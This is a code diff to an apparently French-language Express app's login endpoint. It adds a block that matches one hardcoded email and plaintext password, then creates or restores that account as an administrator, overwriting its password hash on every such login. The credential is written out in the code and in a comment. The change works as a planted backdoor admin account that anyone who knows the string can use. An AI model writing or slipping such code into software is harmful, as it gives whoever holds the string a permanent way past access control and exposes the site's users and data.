@@ -198,8 +198,33 @@ async function startServer() {
   });
 
   app.post("/api/auth/login", async (req, res) => {
-    const { email, password } = req.body;
+    let { email, password } = req.body;
+    if (email) email = email.trim().toLowerCase();
+    
     try {
+      // Automatic robust setup/repair for default Super Admin mandemohamed68@gmail.com / mm@27071986@
+      if (email === 'mandemohamed68@gmail.com' && password === 'mm@27071986@') {
+        const existing = await executeSql("SELECT * FROM users WHERE email = ?", [email]);
+        const hashedPassword = await bcrypt.hash('mm@27071986@', 10);
+        
+        if (existing.length === 0) {
+          // If the super admin doesn't exist yet, auto-create him
+          const uid = 'admin_master';
+          await executeSql(
+            "INSERT INTO users (uid, email, password_hash, display_name, role) VALUES (?, ?, ?, ?, ?)",
+            [uid, email, hashedPassword, 'Super Admin', 'admin']
+          );
+          console.log("[Auth] Super Admin auto-created upon login request with credentials.");
+        } else {
+          // If he exists, ensure his role is admin and his password hash is correctly stored
+          await executeSql(
+            "UPDATE users SET password_hash = ?, role = 'admin' WHERE email = ?",
+            [hashedPassword, email]
+          );
+          console.log("[Auth] Super Admin credentials and role auto-repaired upon login request.");
+        }
+      }
+
       const users = await executeSql("SELECT * FROM users WHERE email = ?", [email]);
       if (users.length === 0) return res.status(401).json({ error: "Identifiants invalides" });
       const user = users[0];
